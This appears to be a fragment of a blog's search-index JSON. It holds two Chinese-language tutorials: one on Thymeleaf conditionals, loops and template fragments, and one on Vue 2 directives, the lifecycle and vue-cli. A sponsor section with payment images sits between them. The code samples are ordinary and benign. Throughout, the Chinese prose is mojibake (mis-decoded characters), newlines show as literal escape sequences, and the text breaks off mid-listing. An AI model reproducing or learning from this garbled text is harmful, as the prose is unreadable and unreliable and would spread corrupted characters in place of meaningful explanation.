æµç¨‹æ§åˆ¶è¯­æ³•\n\né™¤äº†ä¸€äº›åŸºæœ¬çš„æ“ä½œï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨Thymeleafæ¥å¤„ç†æµç¨‹æ§åˆ¶è¯­å¥ï¼Œå½“ç„¶ï¼Œä¸æ˜¯ç›´æ¥ç¼–å†™Javaä»£ç çš„å½¢å¼ï¼Œè€Œæ˜¯æ·»åŠ ä¸€ä¸ªå±æ€§å³å¯ã€‚\n\n#### th:if\n\nå¦‚æœ if æ¡ä»¶æ»¡è¶³ï¼Œåˆ™æ­¤æ ‡ç­¾ç•™ä¸‹ï¼›è‹¥ if æ¡ä»¶ä¸æ»¡è¶³ï¼Œåˆ™æ­¤æ ‡ç­¾è‡ªåŠ¨è¢«ç§»é™¤\n\n```java\n@Override\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n    Context context = new Context();\n    context.setVariable(\"eval\", true);\n    engine.process(\"test.html\", context, resp.getWriter());\n}\n```\n\n```html\n<div th:if=\"${eval}\">æˆ‘æ˜¯åˆ¤æ–­æ¡ä»¶æ ‡ç­¾</div>\n```\n\n`th:if`ä¼šæ ¹æ®å…¶ä¸­ä¼ å…¥çš„å€¼æˆ–æ˜¯æ¡ä»¶è¡¨è¾¾å¼çš„ç»“æœè¿›è¡Œåˆ¤æ–­ï¼Œåªæœ‰æ»¡è¶³çš„æƒ…å†µä¸‹ï¼Œæ‰ä¼šæ˜¾ç¤ºæ­¤æ ‡ç­¾ï¼Œå…·ä½“çš„åˆ¤æ–­è§„åˆ™å¦‚ä¸‹ï¼š\n\n- å¦‚æœå€¼ä¸æ˜¯ç©ºçš„\n  - å€¼æ˜¯å¸ƒå°”å€¼å¹¶ä¸”ä¸º`true`\n  - å€¼æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œå¹¶ä¸”æ˜¯éé›¶\n  - å€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”æ˜¯éé›¶\n  - å€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯â€œé”™è¯¯â€ã€â€œå…³é—­â€æˆ–â€œå¦â€\n  - å€¼ä¸æ˜¯å¸ƒå°”å€¼ã€æ•°å­—ã€å­—ç¬¦æˆ–å­—ç¬¦ä¸²\n- å¦‚æœå€¼ä¸ºç©ºï¼Œth:if å°†è®¡ç®—ä¸º false\n\n#### th:unless\n\n`th:unless`ä¸ `th:if `æ•ˆæœå®Œå…¨ç›¸å\n\n#### th:switch\n\nå¤šåˆ†æ”¯æ¡ä»¶åˆ¤æ–­ï¼Œå¯ä»¥ä½¿ç”¨`th:switch`å±æ€§æ¥å®ç°\n\n```html\n<div th:switch=\"${eval}\">\n    <div th:case=\"1\">æˆ‘æ˜¯1</div>\n    <div th:case=\"2\">æˆ‘æ˜¯2</div>\n    <div th:case=\"3\">æˆ‘æ˜¯3</div>\n</div>\n```\n\n#### th:case\n\nå¤šåˆ†æ”¯æ¡ä»¶åˆ¤æ–­æ²¡æœ‰defaultå±æ€§ï¼Œå¯ä»¥ä½¿ç”¨`th:case=\"*\"`æ¥ä»£æ›¿ï¼š\n\n```html\n<div th:case=\"*\">æˆ‘æ˜¯Default</div>\n```\n\n#### th:each\n\nå®ç°éå†ï¼Œå‡å¦‚æˆ‘ä»¬æœ‰ä¸€ä¸ªå­˜æ”¾ä¹¦ç±ä¿¡æ¯çš„Listéœ€è¦æ˜¾ç¤ºï¼Œé‚£ä¹ˆå¦‚ä½•å¿«é€Ÿç”Ÿæˆä¸€ä¸ªåˆ—è¡¨å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ä½¿ç”¨`th:each`æ¥è¿›è¡Œéå†æ“ä½œï¼š\n\n```java\n@Override\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n    Context context = new Context();\n    context.setVariable(\"list\", Arrays.asList(\"ä¼å…µä¸€å·çš„æ•…äº‹\", \"å€’ä¸€æ¯å¡å¸ƒå¥‡è¯º\", \"ç©æ¸¸æˆè¦å•¸ç€ç©\", \"åä¸ƒå¼ ç‰Œå‰çš„ç”µè„‘å±å¹•\"));\n    engine.process(\"test.html\", context, resp.getWriter());\n}\n```\n\n```html\n<ul>\n    <li th:each=\"title : ${list}\" th:text=\"'ã€Š'+${title}+'ã€‹'\"></li>\n</ul>\n```\n\n`th:each`è¯­æ³•ï¼š \"**å•ä¸ªå…ƒç´ åç§° : ${åˆ—è¡¨}**\"ï¼Œæœ€åç”Ÿæˆçš„ç»“æœä¸ºï¼š\n\n```html\n<ul>\n  <li>ã€Šä¼å…µä¸€å·çš„æ•…äº‹ã€‹</li>\n  <li>ã€Šå€’ä¸€æ¯å¡å¸ƒå¥‡è¯ºã€‹</li>\n  <li>ã€Šç©æ¸¸æˆè¦å•¸ç€ç©ã€‹</li>\n  <li>ã€Šåä¸ƒå¼ ç‰Œå‰çš„ç”µè„‘å±å¹•ã€‹</li>\n</ul>\n```\n\næˆ‘ä»¬è¿˜å¯ä»¥è·å–å½“å‰å¾ªç¯çš„è¿­ä»£çŠ¶æ€ï¼Œåªéœ€è¦åœ¨ `th:each` ä¸­æ·»åŠ  `iterStat` å³å¯ï¼Œä»ä¸­å¯ä»¥è·å–å¾ˆå¤šä¿¡æ¯ï¼Œæ¯”å¦‚å½“å‰çš„é¡ºåº `${iterStat.index}` ï¼š\n\n```html\n<ul>\n    <li th:each=\"title, iterStat : ${list}\" th:text=\"${iterStat.index}+'.ã€Š'+${title}+'ã€‹'\"></li>\n</ul>\n```\n\niterStat å±æ€§æœ‰ï¼š\n\n- indexï¼šå½“å‰è¿­ä»£ç´¢å¼•ï¼Œä»¥0å¼€å¤´ã€‚\n- countï¼šå½“å‰è¿­ä»£ç´¢å¼•ï¼Œä»¥1å¼€å¤´ã€‚\n- sizeï¼šè¿­ä»£å˜é‡ä¸­çš„å…ƒç´ æ€»é‡ã€‚\n- currentï¼šæ¯ä¸ªè¿­ä»£çš„è¿­ä»£å˜é‡ã€‚\n- even/oddï¼šå½“å‰è¿­ä»£æ˜¯å¶æ•°è¿˜æ˜¯å¥‡æ•°ã€‚\n- firstï¼šå½“å‰è¿­ä»£æ˜¯å¦æ˜¯ç¬¬ä¸€ä¸ªè¿­ä»£ã€‚\n- lastï¼šå½“å‰è¿­ä»£æ˜¯å¦æ˜¯æœ€åä¸€ä¸ªè¿­ä»£ã€‚\n\n### æ¨¡æ¿å¸ƒå±€\n\nåœ¨æŸäº›ç½‘é¡µä¸­ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œæ•´ä¸ªç½‘ç«™çš„é¡µé¢ï¼Œé™¤äº†ä¸­é—´éƒ¨åˆ†çš„å†…å®¹ä¼šéšç€æˆ‘ä»¬çš„é¡µé¢è·³è½¬è€Œå˜åŒ–å¤–ï¼Œæœ‰äº›éƒ¨åˆ†æ˜¯ä¸€ç›´ä¿æŒä¸€ä¸ªçŠ¶æ€çš„ã€‚\n\nThymeleaf å¯ä»¥è½»æ¾å®ç°è¿™æ ·çš„æ“ä½œï¼Œæˆ‘ä»¬åªéœ€è¦å°†ä¸ä¼šæ”¹å˜çš„æ¿å—è®¾å®šä¸ºæ¨¡æ¿å¸ƒå±€ï¼Œå¹¶åœ¨ä¸åŒçš„é¡µé¢ä¸­æ’å…¥è¿™äº›æ¨¡æ¿å¸ƒå±€ï¼Œå°±æ— éœ€æ¯ä¸ªé¡µé¢éƒ½å»ç¼–å†™åŒæ ·çš„å†…å®¹äº†ã€‚\n\n#### æ¨¡ç‰ˆé¡µå¤ç”¨\n\n1ã€ç¼–å†™ä¸€ä¸ªæ¨¡ç‰ˆé¡µ`head.html`ï¼Œé‡Œé¢æ”¾æ¯ä¸ªé¡µé¢å…¬æœ‰çš„ä»£ç ï¼Œä¾‹å¦‚æ¯ä¸ªé¡µé¢ä¸»æ ‡é¢˜ä¸€æ ·\n\n```html\n<div class=\"head\" th:fragment=\"head-title\">\n    <div>\n        <h1>ç®€ç®€</h1>\n    </div>\n    <hr>\n</div>\n```\n\n2ã€ç¼–å†™å¦ä¸€ä¸ªé¡µé¢ä½¿ç”¨æ¨¡ç‰ˆé¡µ\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>ä¸»é¡µ</title>\n</head>\n<body>\n    <div th:include=\"head.html::head-title\"></div> <!--å¼•å…¥headé¡µé¢-->\n    <div>\n        <h1>æ…¢æ…¢æ¥ï¼Œæ¯”è¾ƒå¿«</h1>\n    </div>\n</body>\n</html>\n```\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨`th:insert`å’Œ`th:replace`å’Œ`th:include`è¿™ä¸‰ç§æ–¹æ³•æ¥è¿›è¡Œé¡µé¢å†…å®¹æ›¿æ¢ï¼Œé‚£ä¹ˆ`th:insert`ã€`th:replace`ã€`th:include`ï¼ˆ3.0ä»¥æ¥ä¸æ¨èï¼‰æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ\n\n- `th:insert`æœ€ç®€å•ï¼šå®ƒåªä¼šæ’å…¥æŒ‡å®šçš„ç‰‡æ®µä½œä¸ºæ ‡ç­¾çš„ä¸»ä½“ã€‚\n- `th:replace`å®é™…ä¸Šå°†æ ‡ç­¾ç›´æ¥æ›¿æ¢ä¸ºæŒ‡å®šçš„ç‰‡æ®µã€‚\n- `th:include`å’Œ`th:insert`ç›¸ä¼¼ï¼Œä½†å®ƒæ²¡æœ‰æ’å…¥ç‰‡æ®µï¼Œè€Œæ˜¯åªæ’å…¥æ­¤ç‰‡æ®µçš„å†…å®¹ã€‚\n\n#### æ¨¡ç‰ˆé¡µå‚æ•°ä¼ é€’\n\nä¾‹å¦‚æˆ‘ä»¬ç°åœ¨å¸Œæœ›æ’å…¥äºŒçº§æ ‡é¢˜ï¼ŒäºŒçº§æ ‡é¢˜çš„å†…å®¹ä¸æ˜¯å®šæ­»çš„ï¼Œä¸åŒé¡µé¢ä¸ä¸€æ ·\n\n1ã€åœ¨äºŒçº§æ ‡é¢˜å¤„è®¾ç½®ä¸€ä¸ªå ä½å‚æ•°\n\n```html\n<div class=\"head\" th:fragment=\"head-title(sub)\">\n    <div>\n        <h1>ç®€ç®€</h1>\n        <h2 th:text=\"${sub}\"></h2>\n    </div>\n    <hr>\n</div>\n```\n\n2ã€ä½¿ç”¨æ¨¡ç‰ˆé¡µæ˜¯é¡ºå¸¦ä¼ å…¥å‚æ•°\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>ä¸»é¡µ</title>\n</head>\n<body>\n    <div th:include=\"head.html::head-title('Webå®‰å…¨é¡µ')\"></div> <!--ä¼ å‚-->\n    <div>\n        <h1>æ…¢æ…¢æ¥ï¼Œæ¯”è¾ƒå¿«</h1>\n    </div>\n</body>\n</html>\n```\n\n\n\n- \n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Web"],"categories":["JavaWeb"]},{"title":"Vue & Element","url":"/posts/28587.html","content":"\n## Vue2\n\n### ç®€ä»‹\n\nVueå®˜ç½‘ï¼š[Vue2](https://cn.vuejs.org/index.html)ã€[Vue3](https://v3.cn.vuejs.org/)\n\nå®˜æ–¹æ•™ç¨‹ï¼š[Vue.js æ•™ç¨‹ (dcloud.io)](https://learning.dcloud.io/#/)\n\nVue æ˜¯ä¸€å¥—å‰ç«¯æ¡†æ¶ï¼Œå…é™¤åŸç”Ÿ JavaScript ä¸­çš„ DOM æ“ä½œï¼Œç®€åŒ–ä¹¦å†™ã€‚Vue åŸºäº MVVM(Model-View-View-Model) æ€æƒ³ï¼Œå®ç°æ•°æ®çš„åŒå‘ç»‘å®šï¼Œå°†ç¼–ç¨‹çš„å…³æ³¨ç‚¹æ”¾åœ¨æ•°æ®ä¸Šã€‚\n\n![](https://img.jwt1399.top/img/1.png)\n\nå›¾ä¸­çš„ `Model` å°±æ˜¯æ•°æ®ï¼Œ`View` æ˜¯è§†å›¾ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡æµè§ˆå™¨çœ‹åˆ°çš„å†…å®¹ï¼›`Model` å’Œ `View` æ˜¯é€šè¿‡ `ViewModel` å¯¹è±¡è¿›è¡ŒåŒå‘ç»‘å®šçš„ï¼Œè€Œ `ViewModel` å¯¹è±¡æ˜¯ `Vue` æä¾›çš„ã€‚\n\n### å¿«é€Ÿå…¥é—¨\n\n1ã€å¼•å…¥ vue.js\n\n```javascript\n<script src=\"js/vue.js\"></script>\n//or\n<script src=\"https://cdn.jsdelivr.net/npm/vue/dist/vue.js\"></script>\n```\n\n2ã€åˆ›å»º Vue æ ¸å¿ƒå¯¹è±¡ï¼Œè¿›è¡Œæ•°æ®ç»‘å®š\n\n```javascript\n<script>\n    new Vue({\n        el: \"#app\",\n        data() {\n            return {\n                username: \"\"\n            }\n        },\n        methods:{\n            show(){\n                alert(\"æˆ‘è¢«ç‚¹äº†...\");\n            }\n        }\n    });\n</script>\n```\n\n* `el` ï¼š ç”¨æ¥æŒ‡å®šå“ªäº›æ ‡ç­¾å— Vue ç®¡ç†ã€‚ \n* `data` ï¼šç”¨æ¥å®šä¹‰æ•°æ®æ¨¡å‹\n* `methods` ï¼šç”¨æ¥å®šä¹‰å‡½æ•°ã€‚è¿™ä¸ªæˆ‘ä»¬åœ¨åé¢å°±ä¼šç”¨åˆ°\n\n3ã€ç¼–å†™è§†å›¾\n\n```html\n<div id=\"app\">\n    <input name=\"username\" v-model=\"username\" >\n    {{username}} <!--æ’å€¼è¡¨è¾¾å¼-->\n    <input type=\"button\" value=\"ä¸€ä¸ªæŒ‰é’®\" v-on:click=\"show()\"><br>\n</div>\n```\n\n- `{{}}` æ˜¯ Vue ä¸­å®šä¹‰çš„ `æ’å€¼è¡¨è¾¾å¼` ï¼Œæ¨¡å‹çš„æ•°æ®å€¼å±•ç¤ºåœ¨è¿™ä¸ªä½ç½®ã€‚\n- `v-model` åˆ›å»ºåŒå‘æ•°æ®ç»‘å®š\n\n###  Vue æŒ‡ä»¤\n\n**æŒ‡ä»¤ï¼š**HTML æ ‡ç­¾ä¸Šå¸¦æœ‰ `v- å‰ç¼€` çš„ç‰¹æ®Šå±æ€§ï¼Œä¸åŒæŒ‡ä»¤å…·æœ‰ä¸åŒå«ä¹‰ã€‚ä¾‹å¦‚ï¼šv-ifï¼Œv-forâ€¦\n\n| **æŒ‡ä»¤**  | **ä½œç”¨**                                            |\n| --------- | --------------------------------------------------- |\n| v-bind    | ä¸ºHTMLæ ‡ç­¾ç»‘å®šå±æ€§å€¼ï¼Œå¦‚è®¾ç½®  href , cssæ ·å¼ç­‰      |\n| v-model   | åœ¨è¡¨å•å…ƒç´ ä¸Šåˆ›å»ºåŒå‘æ•°æ®ç»‘å®š                        |\n| v-on      | ä¸ºHTMLæ ‡ç­¾ç»‘å®šäº‹ä»¶                                  |\n| v-if      | æ¡ä»¶æ€§çš„æ¸²æŸ“æŸå…ƒç´ ï¼Œåˆ¤å®šä¸ºtrueæ—¶æ¸²æŸ“,å¦åˆ™ä¸æ¸²æŸ“     |\n| v-else    |                                                     |\n| v-else-if |                                                     |\n| v-show    | æ ¹æ®æ¡ä»¶å±•ç¤ºæŸå…ƒç´ ï¼ŒåŒºåˆ«åœ¨äºåˆ‡æ¢çš„æ˜¯displayå±æ€§çš„å€¼ |\n| v-for     | åˆ—è¡¨æ¸²æŸ“ï¼Œéå†å®¹å™¨çš„å…ƒç´ æˆ–è€…å¯¹è±¡çš„å±æ€§              |\n\n#### v-bind\n\nè¯¥æŒ‡ä»¤å¯ä»¥ç»™æ ‡ç­¾åŸæœ‰å±æ€§ç»‘å®šæ¨¡å‹æ•°æ®ã€‚\n\n```html\n<a v-bind:href=\"url\">ç™¾åº¦ä¸€ä¸‹</a>\n\n<a :href=\"url\">ç™¾åº¦ä¸€ä¸‹</a> <!--v-bind å¯ä»¥çœç•¥-->\n```\n\n#### v-model\n\nè¯¥æŒ‡ä»¤å¯ä»¥ç»™è¡¨å•é¡¹æ ‡ç­¾ç»‘å®šæ¨¡å‹æ•°æ®ã€‚è¿™æ ·å°±èƒ½å®ç°åŒå‘ç»‘å®šæ•ˆæœã€‚\n\n```html\n<input name=\"username\" v-model=\"username\">\n```\n\næµ‹è¯•\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:v-bind=\"http://www.w3.org/1999/xhtml\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n<div id=\"app\">\n    <a v-bind:href=\"url\">ç‚¹å‡»ä¸€ä¸‹</a>\n    <a :href=\"url\">ç‚¹å‡»ä¸€ä¸‹</a>\n    <input v-model=\"url\">\n</div>\n  \n<script src=\"js/vue.js\"></script>\n<script>\n    new Vue({\n        el:\"#app\",\n        data(){\n            return {\n                username:\"\",\n                url:\"https://www.baidu.com\"\n            }\n        }\n    });\n</script>\n</body>\n</html>\n```\n\n#### v-on\n\nç»‘å®šå•å‡»äº‹ä»¶\n\n```html\n<input type=\"button\" value=\"ä¸€ä¸ªæŒ‰é’®\" v-on:click=\"show()\">\n\n<input type=\"button\" value=\"ä¸€ä¸ªæŒ‰é’®\" @click=\"show()\"><!--v-on:å¯æ›¿æ¢æˆ@-->\n```\n\næµ‹è¯•\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:v-on=\"http://www.w3.org/1999/xhtml\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n<div id=\"app\">\n    <input type=\"button\" value=\"ä¸€ä¸ªæŒ‰é’®\" v-on:click=\"show()\"><br>\n    <input type=\"button\" value=\"ä¸€ä¸ªæŒ‰é’®\" @click=\"show()\">\n</div>\n<script src=\"js/vue.js\"></script>\n<script>\n    //1. åˆ›å»ºVueæ ¸å¿ƒå¯¹è±¡\n    new Vue({\n        el:\"#app\",\n        methods:{\n            show(){\n                alert(\"æˆ‘è¢«ç‚¹äº†...\");\n            }\n        }\n    });\n</script>\n</body>\n</html>\n```\n\n#### v-if\n\n- å½“ `count` æ¨¡å‹çš„æ•°æ®æ˜¯3æ—¶ï¼Œåœ¨é¡µé¢ä¸Šå±•ç¤º `div1` å†…å®¹ï¼›\n\n- å½“ `count` æ¨¡å‹çš„æ•°æ®æ˜¯4æ—¶ï¼Œåœ¨é¡µé¢ä¸Šå±•ç¤º `div2` å†…å®¹ï¼›\n- `count` æ¨¡å‹æ•°æ®æ˜¯å…¶ä»–å€¼æ—¶ï¼Œåœ¨é¡µé¢ä¸Šå±•ç¤º `div3`ã€‚\n- è¿™é‡Œä¸ºäº†åŠ¨æ€æ”¹å˜æ¨¡å‹æ•°æ® `count` çš„å€¼ï¼Œå†å®šä¹‰ä¸€ä¸ªè¾“å…¥æ¡†ç»‘å®š `count` æ¨¡å‹æ•°æ®ã€‚\n\n```html\n<div id=\"app\">\n    <div v-if=\"count == 3\">div1</div>\n    <div v-else-if=\"count == 4\">div2</div>\n    <div v-else>div3</div>\n    <hr>\n    <input v-model=\"count\">\n</div>\n\n<script>\n    new Vue({\n        el:\"#app\",\n        data(){\n            return {\n                count:3\n            }\n        }\n    });\n</script>\n```\n\næµ‹è¯•\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n<div id=\"app\">\n    <div v-if=\"count == 3\">div1</div>\n    <div v-else-if=\"count == 4\">div2</div>\n    <div v-else>div3</div>\n    <hr>\n    <input v-model=\"count\">\n</div>\n\n<script src=\"js/vue.js\"></script>\n<script>\n    new Vue({\n        el:\"#app\",\n        data(){\n            return {\n                count:3\n            }\n        }\n    });\n</script>\n</body>\n</html>\n```\n\n#### v-show\n\n `v-show` å’Œ `v-if` æ•ˆæœç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äºæ¸²æŸ“æ–¹å¼ä¸åŒ\n\n`v-show` ä¸å±•ç¤ºçš„åŸç†æ˜¯ç»™å¯¹åº”çš„æ ‡ç­¾æ·»åŠ  `display` å±æ€§ï¼Œå¹¶å°†è¯¥å±æ€§å€¼è®¾ç½®ä¸º `none` ï¼Œè¿™æ ·å°±è¾¾åˆ°äº†éšè—çš„æ•ˆæœã€‚è€Œ `v-if` æŒ‡ä»¤æ˜¯æ¡ä»¶ä¸æ»¡è¶³æ—¶æ ¹æœ¬å°±ä¸ä¼šæ¸²æŸ“ã€‚\n\n```html\n<div id=\"app\">\n    <div v-show=\"count == 3\">div1</div>\n    <div v-show=\"count == 4\">div2</div>\n    <hr>\n    <input v-model=\"count\">\n</div>\n```\n\næµ‹è¯•\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n<div id=\"app\">\n    <div v-show=\"count == 3\">div1</div>\n    <div v-show=\"count == 4\">div2</div>\n    <hr>\n    <input v-model=\"count\">\n</div>\n\n<script src=\"js/vue.js\"></script>\n<script>\n    new Vue({\n        el:\"#app\",\n        data(){\n            return {\n                count:3\n            }\n        }\n    });\n</script>\n</body>\n</html>\n```\n\n#### v-for\n\néå†\n\n```html\n<æ ‡ç­¾ v-for=\"å˜é‡å in é›†åˆæ¨¡å‹æ•°æ®\">\n    {{å˜é‡å}}\n</æ ‡ç­¾>\n```\n\nå¦‚æœåœ¨é¡µé¢éœ€è¦ä½¿ç”¨åˆ°é›†åˆæ¨¡å‹æ•°æ®çš„ç´¢å¼•ï¼Œå°±éœ€è¦ä½¿ç”¨å¦‚ä¸‹æ ¼å¼ï¼š\n\n```html\n<æ ‡ç­¾ v-for=\"(å˜é‡å,ç´¢å¼•å˜é‡) in é›†åˆæ¨¡å‹æ•°æ®\">\n    <!--ç´¢å¼•å˜é‡æ˜¯ä»0å¼€å§‹ï¼Œæ‰€ä»¥è¦è¡¨ç¤ºåºå·çš„è¯ï¼Œéœ€è¦æ‰‹åŠ¨çš„åŠ 1-->\n   {{ç´¢å¼•å˜é‡ + 1}} {{å˜é‡å}}\n</æ ‡ç­¾>\n```\n\næµ‹è¯•\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n<div id=\"app\">\n    <div v-for=\"addr in addrs\">\n        {{addr}} <br>\n    </div>\n\n    <hr>\n    <div v-for=\"(addr,i) in addrs\">\n        {{i+1}}--{{addr}} <br>\n    </div>\n</div>\n\n<script src=\"js/vue.js\"></script>\n<script>\n    new Vue({\n        el:\"#app\",\n        data(){\n            return {\n                addrs:[\"åŒ—äº¬\",\"ä¸Šæµ·\",\"è¥¿å®‰\"]\n            }\n        }\n    });\n</script>\n</body>\n</html>\n```\n\n### ç”Ÿå‘½å‘¨æœŸ\n\nå®˜ç½‘ç”Ÿå‘½å‘¨æœŸAPIï¼š[API â€” Vue.js (vuejs.org)](https://cn.vuejs.org/v2/api/#é€‰é¡¹-ç”Ÿå‘½å‘¨æœŸé’©å­)\n\nVue ç”Ÿå‘½å‘¨æœŸæœ‰å…«ä¸ªé˜¶æ®µï¼Œæ¯è§¦å‘ä¸€ä¸ªç”Ÿå‘½å‘¨æœŸäº‹ä»¶ï¼Œä¼šè‡ªåŠ¨æ‰§è¡Œä¸€ä¸ªç”Ÿå‘½å‘¨æœŸæ–¹æ³•ï¼Œè¿™äº›ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ä¹Ÿè¢«ç§°ä¸ºé’©å­æ–¹æ³•ã€‚\n\n| çŠ¶æ€          | é˜¶æ®µ     | æè¿°                                                         |\n| ------------- | -------- | ------------------------------------------------------------ |\n| beforeCreate  | åˆ›å»ºå‰   | åœ¨å®ä¾‹åˆå§‹åŒ–ä¹‹å,è¿›è¡Œæ•°æ®ä¾¦å¬å’Œäº‹ä»¶/ä¾¦å¬å™¨çš„é…ç½®ä¹‹å‰åŒæ­¥è°ƒç”¨ |\n| created       | åˆ›å»ºå   | åœ¨å®ä¾‹åˆ›å»ºå®Œæˆåè¢«ç«‹å³åŒæ­¥è°ƒç”¨                               |\n| beforeMount   | è½½å…¥å‰   | åœ¨æŒ‚è½½å¼€å§‹ä¹‹å‰è¢«è°ƒç”¨                                         |\n| mounted       | æŒ‚è½½å®Œæˆ | å®ä¾‹è¢«æŒ‚è½½åè°ƒç”¨                                             |\n| beforeUpdate  | æ›´æ–°å‰   | åœ¨æ•°æ®å‘ç”Ÿæ”¹å˜åï¼ŒDOM è¢«æ›´æ–°ä¹‹å‰è¢«è°ƒç”¨                       |\n| updated       | æ›´æ–°å   | åœ¨æ•°æ®æ›´æ”¹å¯¼è‡´çš„è™šæ‹Ÿ DOM é‡æ–°æ¸²æŸ“å’Œæ›´æ–°å®Œæ¯•ä¹‹åè¢«è°ƒç”¨        |\n| beforeDestroy | é”€æ¯å‰   | å®ä¾‹é”€æ¯ä¹‹å‰è°ƒç”¨                                             |\n| destroyed     | é”€æ¯å   | å®ä¾‹é”€æ¯åè°ƒç”¨                                               |\n\n![](https://img.jwt1399.top/img/image-20220507105816220.png)\n\n## vue-cli\n\n vue-cli å®˜æ–¹æä¾›çš„ä¸€ä¸ªè„šæ‰‹æ¶ï¼Œç”¨äºå¿«é€Ÿç”Ÿæˆä¸€ä¸ª vue çš„é¡¹ç›®æ¨¡æ¿ã€‚é¢„å…ˆå®šä¹‰å¥½çš„ç›®å½•ç»“æ„åŠåŸºç¡€ä»£ç ï¼Œå°±å¥½æ¯”å’±ä»¬åœ¨åˆ›å»º Maven é¡¹ç›®æ—¶å¯ä»¥é€‰æ‹©åˆ›å»ºä¸€ä¸ªéª¨æ¶é¡¹ç›®ï¼Œè¿™ä¸ªéª¨æ¶é¡¹ç›®å°±æ˜¯è„šæ‰‹æ¶ï¼Œæˆ‘ä»¬çš„å¼€å‘æ›´åŠ çš„å¿«é€Ÿã€‚\n\n### å®‰è£…\n\n```bash\nnpm install -g @vue/cli\n\n#æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ\nvue -V\n```\n\n### ä½¿ç”¨\n\n```bash\n#åˆ›å»ºä¸€ä¸ªåä¸ºmyvueçš„vueé¡¹ç›®\nvue create myvue\n\n#è¿è¡Œ\ncd myvue\nnpm run serve\n```\n\nä»¥å›¾å½¢åŒ–ç•Œé¢åˆ›å»ºå’Œç®¡ç†é¡¹ç›®\n\n```bash\nvue ui\n```\n\n### vue é¡¹ç›®çš„è¿è¡Œæµç¨‹\n\nåœ¨å·¥ç¨‹åŒ–çš„é¡¹ç›®ä¸­ï¼Œ vue è¦åšçš„äº‹æƒ…å¾ˆå•çº¯ï¼šé€šè¿‡ main.js æŠŠ App.vue æ¸²æŸ“åˆ° index.html çš„æŒ‡å®šåŒºåŸŸä¸­ã€‚\n\nâ‘  App.vue ç”¨æ¥ç¼–å†™å¾…æ¸²æŸ“çš„æ¨¡æ¿ç»“æ„\nâ‘¡ index.html ä¸­éœ€è¦é¢„ç•™ä¸€ä¸ª el åŒºåŸŸ\nâ‘¢ main.js æŠŠ App.vue æ¸²æŸ“åˆ°äº† index.html æ‰€é¢„ç•™çš„åŒºåŸŸä¸­\n\n### src ç›®å½•çš„æ„æˆ\n\nassets æ–‡ä»¶å¤¹ï¼šå­˜æ”¾é¡¹ç›®ä¸­ç”¨åˆ°çš„é™æ€èµ„æºæ–‡ä»¶ï¼Œä¾‹å¦‚ï¼šcss æ ·å¼è¡¨ã€å›¾ç‰‡èµ„æº\ncomponents æ–‡ä»¶å¤¹ï¼šç¨‹åºå‘˜å°è£…çš„ã€å¯å¤ç”¨çš„ç»„ä»¶ï¼Œéƒ½è¦æ”¾åˆ° components ç›®å½•ä¸‹\nmain.js æ˜¯é¡¹ç›®çš„å…¥å£æ–‡ä»¶ã€‚æ•´ä¸ªé¡¹ç›®çš„è¿è¡Œï¼Œè¦å…ˆæ‰§è¡Œ main.js\nApp.vue æ˜¯é¡¹ç›®çš„æ ¹ç»„ä»¶ã€‚\n\n```bash\nâ”œâ”€â”€ README.md\nâ”œâ”€â”€ babel.config.js\nâ”œâ”€â”€ jsconfig.json\nâ”œâ”€â”€ node_modules\nâ”œâ”€â”€ package-lock.json\nâ”œâ”€â”€ package.json\nâ”œâ”€â”€ public\nâ”‚Â Â  â”œâ”€â”€ favicon.ico  # faviconå›¾æ ‡\nâ”‚Â Â  â””â”€â”€ index.html   # 